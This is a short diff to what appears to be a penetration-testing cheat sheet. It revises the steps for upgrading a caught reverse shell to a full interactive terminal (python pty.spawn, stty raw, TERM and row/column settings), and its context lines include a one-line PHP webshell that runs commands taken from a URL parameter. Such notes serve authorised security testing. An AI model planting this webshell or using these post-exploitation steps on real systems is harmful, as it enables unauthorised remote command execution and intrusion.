@@ -345,8 +345,11 @@ domain=.
   - python3 -c  import pty;pty.spawn('/bin/bash') 
   - python -c 'import pty; pty.spawn("/bin/bash")'
   - CTRL+Z
-  - export TERM=xterm
-  - stty raw -echo; fg
+  - echo $TERM
+    - export TERM=xterm
+  - stty size
+    - stty raw -echo; fg
+    - stty rows ## columns ##
   - reset
 - Webshell php
   - <?php system($_GET['cmd']);?>
